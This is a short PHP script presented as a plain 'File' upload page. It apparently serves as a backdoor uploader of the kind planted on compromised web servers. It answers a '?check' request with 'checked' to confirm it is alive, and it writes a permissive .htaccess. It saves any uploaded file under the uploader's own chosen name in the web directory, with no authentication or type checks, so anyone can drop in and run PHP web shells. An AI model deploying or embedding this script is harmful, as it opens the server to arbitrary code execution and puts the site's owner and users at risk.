<?php
	if (isset ($_GET['check'])) {
		echo "checked";
		exit;
	}
    
	if (!file_exists(".htaccess")) {

		$text = "Allow from all
        Options -Indexes
		";

		$fp = fopen(".htaccess", "w");
		fwrite($fp, $text);
		fclose($fp);
	}
?>

<!DOCTYPE html>
<html>
<head>
<meta charset=utf-8>
<title>File</title>
</head>
<body>
<h1>File</h1>


<form method="post" enctype="multipart/form-data">
<input type="file" name="filename"><br>
<input type="submit" value="LOAD"><br>
</form>

<?php
if (is_uploaded_file($_FILES["filename"]["tmp_name"]))
	{
	move_uploaded_file($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
	$file = $_FILES["filename"]["name"];
	echo '<a href='.$file.'>'.$file.'</a>';
	} else {
	echo("FILE");
	}

?>
</body>
</html>
